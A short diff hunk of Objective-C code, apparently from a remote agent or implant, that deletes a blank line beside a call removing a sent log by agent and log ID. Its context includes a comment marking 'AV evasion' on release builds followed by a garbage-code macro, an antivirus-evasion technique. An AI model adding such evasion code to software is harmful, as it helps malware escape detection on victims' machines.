@@ -401,7 +401,6 @@
           //
           [logManager removeSendLog: [[anObject objectForKey: @"agentID"] intValue]
                           withLogID: [[anObject objectForKey: @"logID"] intValue]];
-          
           // AV evasion: only on release build
           AV_GARBAGE_004
           
